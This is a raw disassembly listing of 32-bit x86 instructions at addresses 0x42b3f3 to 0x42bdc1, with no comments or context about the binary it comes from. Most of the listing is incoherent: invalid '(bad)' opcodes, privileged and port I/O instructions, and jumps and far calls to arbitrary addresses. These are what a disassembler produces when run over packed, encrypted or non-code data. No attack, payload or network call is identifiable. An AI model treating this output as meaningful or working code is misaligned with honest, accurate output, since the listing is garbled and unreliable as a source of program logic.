  42b3f3:	mov    edx,0x9f801b7f
  42b3f8:	mov    esi,0x10af357f
  42b3fd:	(bad)  
  42b3fe:	jg     0x42b445
  42b400:	xchg   ebx,eax
  42b401:	shl    DWORD PTR [edi],0x62
  42b404:	add    al,0xcb
  42b406:	stos   BYTE PTR es:[edi],al
  42b407:	sbb    DWORD PTR [edx],esi
  42b409:	fwait
  42b40a:	popf   
  42b40b:	mov    eax,es
  42b40d:	nop
  42b40e:	xchg   esp,eax
  42b40f:	sbb    al,0x1f
	...
  42b471:	add    BYTE PTR [eax],al
  42b473:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [edx],edx
  42b481:	stos   BYTE PTR es:[edi],al
  42b482:	retf   0xb955
  42b485:	iret   
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    eax,0xb2000001
  42b48d:	clc    
  42b48e:	mov    bh,0xa9
  42b490:	mov    bh,0xa2
  42b492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b493:	lock jb 0x42b427
  42b496:	retf   0xec7
  42b499:	lea    edi,[esi+ebx*1-0x64]
  42b49d:	aas    
  42b49e:	sti    
  42b49f:	test   BYTE PTR [edx+0x68],0xe
  42b4a3:	ins    BYTE PTR es:[edi],dx
  42b4a4:	or     DWORD PTR [eax-0x13],0xf
  42b4a8:	push   ebp
  42b4a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4aa:	repz and BYTE PTR [ebx],ah
  42b4ad:	(bad)  
  42b4ae:	pusha  
  42b4af:	or     dl,BYTE PTR [ecx]
  42b4b1:	sub    BYTE PTR [esi+0x6b122840],bl
  42b4b7:	mov    WORD PTR [edx],?
  42b4b9:	mov    ebp,0x521dc9d1
  42b4be:	xchg   esp,eax
  42b4bf:	sbb    eax,0xfc08701c
  42b4c4:	retf   0x6102
  42b4c7:	or     al,0xc1
  42b4c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4ca:	xor    eax,0xd381a07
  42b4cf:	mov    ds:0xb5b36f04,eax
  42b4d4:	test   BYTE PTR [ecx-0x14],dl
  42b4d7:	ret    
  42b4d8:	fs aam 0x91
  42b4db:	stc    
  42b4dc:	push   esi
  42b4de:	push   edi
  42b4df:	adc    al,0x7e
  42b4e1:	sub    DWORD PTR [ecx-0x4e],esi
  42b4e4:	pop    ebp
  42b4e5:	xor    BYTE PTR ds:0x5df66fa1,cl
  42b4eb:	xchg   dl,cl
  42b4ed:	fwait
  42b4ee:	mov    WORD PTR [edx+0x355ab877],?
  42b4f4:	jnp    0x42b53f
  42b4f6:	pusha  
  42b4f7:	or     DWORD PTR [edi+0x57],edi
  42b4fa:	xchg   esi,eax
  42b4fb:	aaa    
  42b4fc:	cmp    al,0x4b
  42b4fe:	jns    0x42b562
  42b500:	sbb    eax,0x8987b84
  42b505:	mov    ch,0x28
  42b507:	push   esp
  42b508:	mov    ds:0xcc83da98,eax
  42b50d:	cmp    ebp,esp
  42b50f:	or     dl,dh
  42b511:	jmp    0x42b4cd
  42b513:	mov    bh,0xfb
  42b515:	cmp    al,0xf4
  42b517:	popf   
  42b518:	mul    DWORD PTR [eax-0x32d7ba38]
  42b51e:	test   eax,0xe7a61bd9
  42b523:	jmp    0x91021f3e
  42b528:	dec    eax
  42b529:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b52a:	mov    cl,BYTE PTR [ebx]
  42b52c:	xchg   edi,eax
  42b52d:	cmc    
  42b52e:	mov    al,0xaa
  42b530:	mov    dl,0x7e
  42b532:	std    
  42b533:	pushf  
  42b534:	mov    ?,WORD PTR [esi]
  42b536:	inc    edi
  42b537:	(bad)
  42b53b:	sub    DWORD PTR [ecx+0x2edd599f],0x40
  42b542:	idiv   DWORD PTR [edi-0x41]
  42b545:	xchg   esp,eax
  42b546:	mov    ss,ebx
  42b548:	ror    BYTE PTR [esi-0x8],cl
  42b54b:	(bad)  [edi+0x10]
  42b54e:	add    ah,al
  42b550:	sub    DWORD PTR [eax-0x51],ecx
  42b553:	dec    edx
  42b554:	adc    ebx,DWORD PTR [ecx]
  42b556:	cld    
  42b557:	push   ecx
  42b558:	sbb    DWORD PTR es:[edi+edi*4],ecx
  42b55c:	mov    cl,bh
  42b55e:	in     al,dx
  42b55f:	in     eax,0xb7
  42b561:	scas   al,BYTE PTR es:[edi]
  42b562:	call   0xaa7f6ec0
  42b567:	dec    edx
  42b568:	icebp  
  42b569:	pushf  
  42b56a:	mov    ecx,edx
  42b56c:	pop    ds
  42b56d:	int    0xc4
  42b56f:	sub    BYTE PTR [esi-0x18],bl
  42b572:	shl    DWORD PTR [ecx-0x35],cl
  42b575:	push   0x5bd8430e
  42b57a:	adc    DWORD PTR [ebp+0x2c],ebp
  42b57d:	sbb    ah,bh
  42b57f:	pop    ebp
  42b580:	or     edi,esp
  42b582:	test   BYTE PTR [esi+0x1b],dh
  42b585:	mov    esp,0x4939d6df
  42b58a:	stos   DWORD PTR es:[edi],eax
  42b58b:	mov    bh,0x52
  42b58d:	and    al,0x25
  42b58f:	xchg   DWORD PTR [eax+0x0],esp
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	xlat   BYTE PTR ds:[ebx]
  42b601:	or     edx,DWORD PTR [eax]
  42b603:	daa    
  42b604:	mov    esi,0x50001d0
  42b609:	add    DWORD PTR [eax],eax
  42b60b:	add    BYTE PTR [eax+0x4f],ch
  42b60e:	into   
  42b60f:	fsubr  DWORD PTR [ebp+0x48]
  42b612:	or     eax,0xe94d08f2
  42b617:	xor    al,0x15
  42b619:	(bad)  
  42b61a:	fdivr  QWORD PTR [ebx]
  42b61c:	retf   0xe508
  42b61f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b620:	push   esp
  42b621:	mov    edx,0x25f4efd9
  42b626:	and    eax,0x6031f5d2
  42b62b:	xchg   BYTE PTR [ecx],bh
  42b62d:	cdq    
  42b62e:	cmp    eax,0x995865eb
  42b633:	aas    
  42b634:	fsubrp st(1),st
  42b636:	push   0x92d59d6c
  42b63b:	popa   
  42b63c:	scas   al,BYTE PTR es:[edi]
  42b63d:	jecxz  0x42b5d3
  42b63f:	lods   eax,DWORD PTR ds:[esi]
  42b640:	mov    ch,0xab
  42b642:	iret   
  42b643:	mov    ds:0xeb4658ca,al
  42b648:	repnz mov edi,0x7a5c49e6
  42b64e:	bound  esp,QWORD PTR [esp+eiz*8]
  42b651:	test   eax,0xa74e64fe
  42b656:	pop    edx
  42b657:	inc    edx
  42b658:	dec    ebp
  42b659:	daa    
  42b65a:	scas   eax,DWORD PTR es:[edi]
  42b65b:	outs   dx,DWORD PTR ds:[esi]
  42b65c:	ds xchg ecx,eax
  42b65e:	xchg   esi,eax
  42b65f:	outs   dx,DWORD PTR ds:[esi]
  42b660:	xor    esi,0x1d
  42b663:	add    al,0x4f
  42b665:	stos   BYTE PTR es:[edi],al
  42b666:	mov    ah,0xb4
  42b668:	sbb    ah,ch
  42b66a:	cmc    
  42b66b:	sbb    ch,BYTE PTR [ebp-0x1cd9964a]
  42b671:	lods   al,BYTE PTR ds:[esi]
  42b672:	enter  0x1279,0xcc
  42b676:	jnp    0x42b666
  42b678:	push   ebx
  42b679:	xchg   ebp,eax
  42b67a:	xor    DWORD PTR ds:0x5be68aca,0x334cbe34
  42b684:	cmp    BYTE PTR [ebx+edi*2+0x539a0fe7],bl
  42b68b:	push   edx
  42b68c:	jmp    0xb375ee83
  42b691:	mov    ss,WORD PTR [ecx-0x6ba97917]
  42b697:	mov    cl,BYTE PTR [eax]
  42b699:	call   0x533114a8
  42b69e:	xchg   ebx,eax
  42b69f:	mov    cs,WORD PTR [eax]
  42b6a1:	or     al,0xe1
  42b6a3:	ror    BYTE PTR [esi],1
  42b6a5:	dec    esi
  42b6a6:	mov    ?,WORD PTR [eax+ebp*2]
  42b6a9:	xchg   edi,eax
  42b6aa:	pushf  
  42b6ab:	je     0x42b66f
  42b6ad:	ret    0xd64d
  42b6b0:	ss add ecx,ebp
  42b6b3:	in     al,dx
  42b6b4:	mov    DWORD PTR [eax+0x4e],ebx
  42b6b7:	aas    
  42b6b8:	ins    BYTE PTR es:[edi],dx
  42b6b9:	dec    ebp
  42b6ba:	les    eax,FWORD PTR [ebp-0x7a]
  42b6bd:	mov    ds:0x605732d3,eax
  42b6c2:	je     0x42b6cc
  42b6c4:	add    DWORD PTR [eax-0x6a],ebx
  42b6c7:	xor    bx,cx
  42b6ca:	arpl   WORD PTR [edi+0x31],bp
  42b6cd:	call   0x7eee:0xf22d30a4
  42b6d4:	sahf   
  42b6d5:	data16 (bad) 
  42b6d8:	scas   eax,DWORD PTR es:[edi]
  42b6d9:	xchg   DWORD PTR [edx+0x43a78127],eax
  42b6df:	mov    DWORD PTR [edi+0x7b],edx
  42b6e2:	out    dx,al
  42b6e3:	mov    al,0xd2
  42b6e5:	call   DWORD PTR [esi]
  42b6e7:	xchg   ebx,eax
  42b6e8:	dec    edi
  42b6e9:	pop    ss
  42b6ea:	push   eax
  42b6eb:	fsubp  st(7),st
  42b6ed:	mov    ebp,0xe51b1b1f
  42b6f2:	mov    dh,0x32
  42b6f4:	mov    fs,WORD PTR [eax]
  42b6f6:	jo     0x42b75a
  42b6f8:	test   BYTE PTR [eax],dl
  42b6fa:	popf   
  42b6fb:	xchg   BYTE PTR [edi-0x74],dh
  42b6fe:	nop
  42b6ff:	mov    dl,0xab
  42b701:	lods   eax,DWORD PTR ds:[esi]
  42b702:	mov    ch,BYTE PTR [ecx+edi*8]
  42b705:	sbb    al,0x1
  42b707:	mov    ecx,DWORD PTR [ebx+eax*1]
  42b70a:	ret    0x70c1
  42b70d:	mov    cl,0xed
  42b70f:	xlat   BYTE PTR ds:[ebx]
  42b710:	and    al,BYTE PTR [eax]
	...
  42b772:	add    BYTE PTR [eax],al
  42b774:	dec    esi
  42b775:	inc    edx
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	addr16 or cl,bh
  42b783:	mov    bl,0xd1
  42b786:	add    DWORD PTR [eax],eax
  42b788:	add    eax,0x61000001
  42b78d:	push   eax
  42b78e:	mov    ebp,DWORD PTR [esp+eiz*8]
  42b791:	sbb    DWORD PTR [esi+0x49c878d5],ecx
  42b797:	and    eax,0xc38152f4
  42b79c:	cmp    DWORD PTR [ebx-0x13],eax
  42b79f:	add    eax,ecx
  42b7a1:	xor    BYTE PTR [edi-0x5e],0xda
  42b7a5:	and    DWORD PTR ss:[edx],eax
  42b7a8:	xchg   esp,eax
  42b7a9:	lods   al,BYTE PTR ds:[esi]
  42b7aa:	mov    cl,0x5f
  42b7ac:	shl    DWORD PTR [eax+eiz*1-0x6e94727f],cl
  42b7b3:	scas   al,BYTE PTR es:[edi]
  42b7b4:	mov    ecx,0x5e4b47a5
  42b7b9:	sbb    ecx,edi
  42b7bb:	cwde   
  42b7bc:	push   ebp
  42b7bd:	arpl   WORD PTR [ecx],bp
  42b7bf:	rcr    BYTE PTR [ebx],cl
  42b7c1:	dec    esp
  42b7c2:	jp     0x42b7cf
  42b7c4:	out    dx,eax
  42b7c5:	mov    esi,0x1bd67826
  42b7ca:	and    bl,ah
  42b7cc:	and    al,0x7e
  42b7ce:	rcr    ecx,cl
  42b7d0:	dec    esp
  42b7d1:	(bad)  
  42b7d2:	xor    BYTE PTR [ecx+0x72],bh
  42b7d5:	out    dx,al
  42b7d6:	aad    0x3
  42b7d8:	mov    al,ds:0x5ae7418f
  42b7dd:	xchg   edx,ebp
  42b7df:	xchg   DWORD PTR [edi-0x3c],eax
  42b7e2:	das    
  42b7e3:	mov    eax,0xff98867a
  42b7e8:	xor    ebp,edx
  42b7ea:	cld    
  42b7eb:	lahf   
  42b7ec:	sti    
  42b7ed:	mov    eax,0x3add9174
  42b7f2:	stos   DWORD PTR es:[edi],eax
  42b7f3:	cmp    al,0xb1
  42b7f5:	xlat   BYTE PTR ds:[ebx]
  42b7f6:	mov    edi,0x42f51d00
  42b7fc:	mov    ds:0x86ce3c41,eax
  42b801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b802:	mov    esi,0xd2a8220c
  42b807:	mov    esp,0x41d5757c
  42b80c:	dec    esp
  42b80d:	mov    dl,0x57
  42b80f:	adc    ch,BYTE PTR [edi-0x3b0c3654]
  42b815:	adc    eax,DWORD PTR [eax+0x1439fea3]
  42b81b:	ss mov ebx,0x5097250a
  42b821:	fiadd  WORD PTR [edi+0x28]
  42b824:	mov    DWORD PTR [edx],0xa09917ac
  42b82a:	fs jmp 0x5cc0:0xa8233fd7
  42b832:	cdq    
  42b833:	nop
  42b834:	or     edx,DWORD PTR [ebx+0x5d77105]
  42b83a:	cdq    
  42b83b:	push   ecx
  42b83c:	jns    0x42b8ad
  42b83e:	cwde   
  42b83f:	adc    al,0x10
  42b841:	aam    0xe
  42b843:	mov    ch,0xe4
  42b845:	dec    ecx
  42b846:	or     ecx,DWORD PTR [edi+0x2956a34]
  42b84c:	jge    0x42b8b7
  42b84e:	xor    al,0x25
  42b850:	inc    esi
  42b851:	mov    ds:0x629955ff,eax
  42b856:	pop    edx
  42b857:	mov    ah,0xba
  42b859:	ss pop eax
  42b85b:	jmp    0xd8f54d83
  42b860:	push   ss
  42b861:	push   0xcac633c8
  42b866:	adc    eax,0xfc977865
  42b86b:	mov    ebp,0x3919ff5
  42b870:	sbb    esp,DWORD PTR [eax-0x591a3b3a]
  42b876:	jg     0x42b882
  42b878:	inc    esi
  42b879:	mov    cl,0x89
  42b87b:	clc    
  42b87c:	or     esi,eax
  42b87e:	je     0x42b8be
  42b880:	add    eax,0xfe359238
  42b885:	fidiv  WORD PTR [edi+eiz*1]
  42b888:	nop
  42b889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b88a:	fwait
  42b88b:	hlt    
  42b88c:	das    
  42b88d:	test   al,0xa9
  42b88f:	and    BYTE PTR [ebx+0x0],0x0
	...
  42b8f2:	add    BYTE PTR [eax],al
  42b8f4:	call   0x2a7796
  42b8f9:	out    0xf9,eax
  42b8fb:	lahf   
  42b8fc:	ret    0x608c
  42b8ff:	or     ebx,DWORD PTR [esi-0x37820bf7]
  42b905:	rol    BYTE PTR [ecx],cl
  42b907:	add    BYTE PTR ds:0xaa000001,al
  42b90d:	fdivr  DWORD PTR [esi-0x37]
  42b910:	push   es
  42b911:	and    ch,0xea
  42b914:	sbb    bl,bl
  42b916:	pop    es
  42b917:	aas    
  42b918:	fimul  DWORD PTR [esi-0x67]
  42b91b:	sbb    edi,eax
  42b91d:	scas   al,BYTE PTR es:[edi]
  42b91e:	push   0x884e1764
  42b923:	adc    DWORD PTR [ebp-0x536fe03c],edi
  42b929:	sub    al,0x64
  42b92b:	mov    dh,0x9e
  42b92d:	scas   eax,DWORD PTR es:[edi]
  42b92e:	fnstcw WORD PTR [ebp+0x12]
  42b931:	mov    BYTE PTR [edi+0x70c30421],ch
  42b937:	std    
  42b938:	sub    BYTE PTR [ebx+0x2ee7e51e],bl
  42b93e:	lods   al,BYTE PTR ds:[esi]
  42b93f:	mov    ebx,0x8a8f08a1
  42b944:	in     al,dx
  42b945:	sbb    edx,ecx
  42b947:	aas    
  42b948:	repnz xlat BYTE PTR ds:[ebx]
  42b94a:	and    bh,BYTE PTR [ecx]
  42b94c:	pop    ecx
  42b94d:	jae    0x42b8f0
  42b94f:	jl     0x42b963
  42b951:	sbb    eax,0x2aabc1a4
  42b956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b957:	loopne 0x42b968
  42b959:	rol    DWORD PTR [ecx-0x3793ff91],cl
  42b95f:	das    
  42b960:	push   edx
  42b961:	pop    ds
  42b962:	jge    0x42b930
  42b964:	adc    DWORD PTR [ebx+0x1084f7ba],ebx
  42b96a:	ds jns 0x42b938
  42b96d:	add    esi,edi
  42b96f:	cdq    
  42b970:	xchg   ebx,eax
  42b971:	mov    WORD PTR [esi-0x45],ss
  42b974:	add    al,0x9f
  42b976:	das    
  42b977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b978:	push   edi
  42b979:	aas    
  42b97a:	add    eax,ebp
  42b97c:	in     al,dx
  42b97d:	push   esi
  42b97e:	rcr    BYTE PTR [edx-0xa858449],cl
  42b984:	fwait
  42b985:	mul    ch
  42b987:	pusha  
  42b988:	adc    eax,0x710d7f82
  42b98d:	jge    0x42b942
  42b98f:	pop    edx
  42b990:	test   al,0xaf
  42b992:	and    BYTE PTR [eax],al
  42b994:	sub    bl,BYTE PTR [ebx]
  42b996:	push   edx
  42b997:	fidiv  DWORD PTR [esi+0x21]
  42b99a:	lea    ecx,[ecx-0x52b32df1]
  42b9a0:	fmulp  st(3),st
  42b9a2:	retf   0x8dcd
  42b9a5:	or     bl,dl
  42b9a7:	push   ss
  42b9a8:	sbb    bl,bh
  42b9aa:	lds    edi,FWORD PTR [edi+0x32]
  42b9ad:	add    dl,BYTE PTR [eax+0x5a23e4ae]
  42b9b3:	cs (bad) 
  42b9b5:	das    
  42b9b6:	ret    0x6df7
  42b9b9:	sub    DWORD PTR [ebp+0x77d2db02],ecx
  42b9bf:	adc    edi,DWORD PTR [eax-0x18]
  42b9c2:	xor    ah,bh
  42b9c4:	jae    0x42b979
  42b9c6:	fwait
  42b9c7:	dec    eax
  42b9c8:	jge    0x42ba1b
  42b9ca:	gs inc esi
  42b9cc:	scas   al,BYTE PTR es:[edi]
  42b9cd:	cmp    esi,ebp
  42b9cf:	ja     0x42b9c1
  42b9d1:	cld    
  42b9d2:	stc    
  42b9d3:	push   0x5e
  42b9d5:	stos   DWORD PTR es:[edi],eax
  42b9d6:	sbb    cl,dh
  42b9d8:	xchg   ecx,eax
  42b9d9:	imul   edi,ebx,0x945f7802
  42b9df:	mov    ebx,0x48b1dfe0
  42b9e4:	ret    
  42b9e5:	not    BYTE PTR ds:0xb14f878d
  42b9eb:	repz or esi,ebp
  42b9ee:	and    eax,0xe6decc80
  42b9f3:	push   edx
  42b9f4:	fld    QWORD PTR [ebp-0x4d]
  42b9f7:	aad    0x71
  42b9f9:	mov    dl,0xb9
  42b9fb:	pop    edx
  42b9fc:	dec    esp
  42b9fd:	mov    dh,0xd1
  42b9ff:	repz pop ss
  42ba01:	mov    eax,ds:0xa62cd382
  42ba06:	je     0x42b9f3
  42ba08:	(bad)  
  42ba09:	arpl   di,dx
  42ba0b:	mov    DWORD PTR [ecx+0x67],edx
  42ba0e:	(bad)  
  42ba10:	pop    ss
	...
  42ba71:	add    BYTE PTR [eax],al
  42ba73:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42ba79:	neg    ebx
  42ba7b:	outs   dx,DWORD PTR ds:[esi]
  42ba7c:	push   0x5b
  42ba7e:	xchg   ecx,eax
  42ba7f:	or     DWORD PTR [edx-0x325d9321],eax
  42ba85:	rol    DWORD PTR [ecx],cl
  42ba87:	add    BYTE PTR ds:0x9a000001,al
  42ba8d:	retf   0xd14e
  42ba90:	push   edi
  42ba91:	mov    edi,0xc37d5598
  42ba96:	push   cs
  42ba97:	dec    ebx
  42ba98:	cmc    
  42ba99:	scas   eax,DWORD PTR es:[di]
  42ba9b:	ret    
  42ba9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ba9d:	lahf   
  42ba9e:	add    ebx,DWORD PTR [edx-0x54]
  42baa1:	pop    eax
  42baa2:	aam    0xc7
  42baa4:	mov    DWORD PTR [edx-0x767278b9],ebp
  42baaa:	xor    al,0x67
  42baac:	push   edi
  42baad:	outs   dx,DWORD PTR ds:[esi]
  42baae:	mov    esi,0xff3d74bd
  42bab3:	enter  0x75c6,0xab
  42bab7:	cs stos BYTE PTR es:[edi],al
  42bab9:	jbe    0x42baa9
  42babb:	pushf  
  42babc:	arpl   WORD PTR [eax+0x13c15cf8],cx
  42bac2:	mov    eax,0x7f93d109
  42bac7:	xchg   esi,eax
  42bac8:	cwde   
  42bac9:	dec    edx
  42baca:	pop    ds
  42bacb:	pop    es
  42bacc:	jge    0x42baad
  42bace:	rcl    BYTE PTR [esi+ebp*4-0x3daa6bdd],cl
  42bad5:	inc    esp
  42bad6:	adc    esi,DWORD PTR [ebx-0xb]
  42bad9:	in     al,0xfc
  42badb:	cmp    eax,0xe056cb7e
  42bae0:	ins    BYTE PTR es:[edi],dx
  42bae1:	xchg   edx,eax
  42bae2:	sub    eax,0xed4a5000
  42bae7:	jbe    0x42baf4
  42bae9:	shl    DWORD PTR [ecx-0x6f4c1c7c],1
  42baef:	lds    esi,FWORD PTR [edx]
  42baf1:	stos   DWORD PTR es:[edi],eax
  42baf2:	adc    DWORD PTR [ebx+0xb],0x7da28302
  42baf9:	push   0x2ee1ebf2
  42bafe:	dec    ecx
  42baff:	into   
  42bb00:	sub    dh,bl
  42bb02:	dec    edx
  42bb03:	pop    ecx
  42bb04:	inc    ecx
  42bb05:	xchg   edi,eax
  42bb06:	add    ch,ah
  42bb08:	fiadd  DWORD PTR [ebp-0x6e]
  42bb0b:	mov    BYTE PTR [edi],bl
  42bb0d:	mov    BYTE PTR [ebx+0x69],dl
  42bb10:	sub    esp,DWORD PTR [esi+edi*8+0x24]
  42bb14:	into   
  42bb15:	inc    esi
  42bb16:	fisttp DWORD PTR [eax-0x29186d0]
  42bb1c:	jo     0x42bb57
  42bb1e:	adc    eax,0x7708199
  42bb23:	std    
  42bb24:	add    bl,BYTE PTR [esi]
  42bb26:	data16 (bad) 
  42bb28:	fst    DWORD PTR [edx+0x63]
  42bb2b:	mov    dl,0xb0
  42bb2d:	adc    cl,BYTE PTR gs:[ecx+ebp*4]
  42bb31:	pop    es
  42bb32:	mov    eax,0xafd1443f
  42bb37:	aam    0x6d
  42bb39:	neg    BYTE PTR [ecx+0x7847fa4c]
  42bb3f:	pop    ebp
  42bb40:	cli    
  42bb41:	mov    eax,ds:0x77fd365d
  42bb46:	lock sbb dh,BYTE PTR [ebp+0x7af281c6]
  42bb4d:	or     ch,BYTE PTR [eax]
  42bb4f:	jae    0x42bb58
  42bb51:	and    al,0x14
  42bb53:	add    eax,0x20965773
  42bb58:	mov    ecx,0x81f1b7c4
  42bb5d:	or     edi,ebx
  42bb5f:	daa    
  42bb60:	jl     0x42bb19
  42bb62:	xchg   esp,eax
  42bb63:	stos   DWORD PTR es:[edi],eax
  42bb64:	loopne 0x42bbcd
  42bb66:	push   cs
  42bb67:	xchg   esp,eax
  42bb68:	call   0x3cd5:0x785cc502
  42bb6f:	fild   WORD PTR [ecx]
  42bb71:	pop    ds
  42bb72:	push   ebx
  42bb73:	ret    0xf972
  42bb76:	mov    bl,0x2c
  42bb78:	hlt    
  42bb79:	mov    DWORD PTR [eax-0x71ef2873],ebp
  42bb7f:	in     al,0x7e
  42bb81:	fcomi  st,st(4)
  42bb83:	mov    esp,0x5cea4e5c
  42bb88:	pop    esi
  42bb89:	cld    
  42bb8a:	xor    ecx,0x482fb0b9
  42bb90:	std    
	...
  42bbf1:	add    BYTE PTR [eax],al
  42bbf3:	add    BYTE PTR [eax+ebp*1],dh
  42bbf6:	add    DWORD PTR [esi],eax
  42bbf8:	sbb    eax,0x233a372f
  42bbfd:	sub    DWORD PTR [ebx],eax
  42bbff:	dec    ecx
  42bc00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc01:	dec    edx
  42bc02:	push   ss
  42bc03:	push   esp
  42bc04:	rcl    ah,cl
  42bc06:	add    DWORD PTR [eax],eax
  42bc08:	add    eax,0x1a000001
  42bc0d:	cmp    al,BYTE PTR [edi+0x22]
  42bc10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc11:	pop    ecx
  42bc12:	retf   0x2f1b
  42bc15:	mov    eax,ds:0xf5997b55
  42bc1a:	fdivrp st(0),st
  42bc1c:	test   DWORD PTR [ecx+0x15f47ebb],esp
  42bc22:	cmp    BYTE PTR [edi],dh
  42bc24:	xor    eax,DWORD PTR [eax+0x42]
  42bc27:	rcr    DWORD PTR [edi-0x27a87179],1
  42bc2d:	dec    eax
  42bc2e:	out    0xe0,al
  42bc30:	mov    ecx,0xa12b4b82
  42bc35:	stc    
  42bc36:	shr    BYTE PTR [edi],1
  42bc38:	push   0xe8fb0401
  42bc3d:	inc    edx
  42bc3e:	jl     0x42bc65
  42bc40:	frstor [esi+eiz*2]
  42bc43:	in     eax,0xf4
  42bc45:	jae    0x42bc32
  42bc47:	inc    ebx
  42bc48:	pop    si
  42bc4a:	push   edx
  42bc4b:	call   0x814e324e
  42bc50:	imul   ebx,DWORD PTR [ecx+0xb],0x6c
  42bc54:	pushf  
  42bc55:	mov    edi,0xb7358262
  42bc5a:	xor    dl,dh
  42bc5c:	mov    dl,0xce
  42bc5e:	pop    eax
  42bc5f:	retf   0xe8b7
  42bc62:	xchg   ah,bh
  42bc64:	jae    0x42bc80
  42bc66:	xlat   BYTE PTR ds:[ebx]
  42bc67:	in     eax,0xd2
  42bc69:	nop    esi
  42bc6c:	leave  
  42bc6d:	je     0x42bc43
  42bc6f:	mov    ch,0x89
  42bc71:	dec    ebp
  42bc72:	mov    dh,0x59
  42bc74:	and    bh,BYTE PTR [eax+0x428881b4]
  42bc7a:	scas   eax,DWORD PTR es:[edi]
  42bc7b:	ins    DWORD PTR es:[edi],dx
  42bc7c:	dec    eax
  42bc7d:	fdiv   DWORD PTR [ebp-0x7785955e]
  42bc83:	leave  
  42bc84:	ss pop edi
  42bc86:	test   eax,0x239b2560
  42bc8b:	mov    edx,0x79bda68b
  42bc90:	pop    edi
  42bc91:	repz retf 
  42bc93:	bound  esi,QWORD PTR [ecx+0x2f7392fb]
  42bc99:	into   
  42bc9a:	adc    eax,0x32c49605
  42bc9f:	ss pusha 
  42bca1:	das    
  42bca2:	sbb    al,0x96
  42bca4:	(bad)  
  42bca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bca6:	sahf   
  42bca7:	jle    0x42bc5b
  42bca9:	scas   al,BYTE PTR es:[edi]
  42bcaa:	jmp    0xf8773cb0
  42bcaf:	jbe    0x42bd22
  42bcb1:	fcomi  st,st(3)
  42bcb3:	jbe    0x42bd06
  42bcb5:	in     eax,dx
  42bcb6:	pop    esi
  42bcb7:	and    DWORD PTR [ecx-0x1a5a3bcd],esp
  42bcbd:	out    0xf2,al
  42bcbf:	aaa    
  42bcc0:	lods   eax,DWORD PTR ds:[esi]
  42bcc1:	dec    esp
  42bcc2:	data16 loop 0x42bc6e
  42bcc5:	ins    DWORD PTR es:[edi],dx
  42bcc6:	mov    ds:0x4fc442f0,eax
  42bccb:	fsubr  DWORD PTR [ebx]
  42bccd:	cli    
  42bcce:	je     0x42bc95
  42bcd0:	inc    ebp
  42bcd1:	std    
  42bcd2:	inc    ebx
  42bcd3:	sub    bl,ch
  42bcd5:	cmc    
  42bcd6:	inc    ebx
  42bcd7:	jo     0x42bd15
  42bcd9:	jg     0x42bcdf
  42bcdb:	jecxz  0x42bd55
  42bcdd:	popf   
  42bcde:	and    DWORD PTR [ecx],esi
  42bce0:	jge    0x42bc6e
  42bce2:	fdiv   st(7),st
  42bce4:	add    DWORD PTR [edx-0x40],ecx
  42bce7:	xchg   BYTE PTR [esi],bl
  42bce9:	xor    cl,al
  42bceb:	dec    ecx
  42bcec:	xlat   BYTE PTR ds:[ebx]
  42bced:	sub    ebx,DWORD PTR [edi]
  42bcef:	xchg   ebp,eax
  42bcf0:	dec    esp
  42bcf1:	push   ecx
  42bcf2:	sbb    esi,DWORD PTR [ecx+0x2]
  42bcf5:	loope  0x42bcf7
  42bcf7:	mov    ?,WORD PTR [ecx+0x10]
  42bcfa:	dec    edx
  42bcfb:	and    DWORD PTR [esi+0x6e4f7477],ebp
  42bd01:	rcl    DWORD PTR [edx],1
  42bd03:	xor    eax,eax
  42bd05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd06:	(bad)  
  42bd07:	nop
  42bd08:	xor    edx,ebp
  42bd0a:	and    al,0xc2
  42bd0c:	imul   ebp,DWORD PTR [eax+0x79e265],0x0
	...
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bdf1
  42bd81:	sbb    DWORD PTR [edx+0x4c],esi
  42bd84:	xlat   BYTE PTR ds:[ebx]
  42bd85:	aad    0x1
  42bd87:	add    BYTE PTR ds:0x19000001,al
  42bd8d:	paddsw mm6,mm6
  42bd90:	iret   
  42bd91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd92:	sub    ch,BYTE PTR [edi+esi*4-0x88800a6]
  42bd99:	cmc    
  42bd9a:	(bad)  
  42bd9b:	sbb    DWORD PTR [ecx-0x36],ebp
  42bd9e:	xchg   ebp,eax
  42bd9f:	in     eax,dx
  42bda0:	cld    
  42bda1:	ret    
  42bda2:	mov    al,ds:0x2fc068b7
  42bda7:	inc    ebx
  42bda8:	pop    ds
  42bda9:	test   DWORD PTR [ebx],0xf802a52c
  42bdaf:	outs   dx,DWORD PTR ds:[esi]
  42bdb0:	shr    BYTE PTR [ecx+0x743f7082],cl
  42bdb6:	fdivr  QWORD PTR [edi+0x4a6951b1]
  42bdbc:	xor    eax,0xefb861a7
  42bdc1:	xor    eax,0xe9d97083
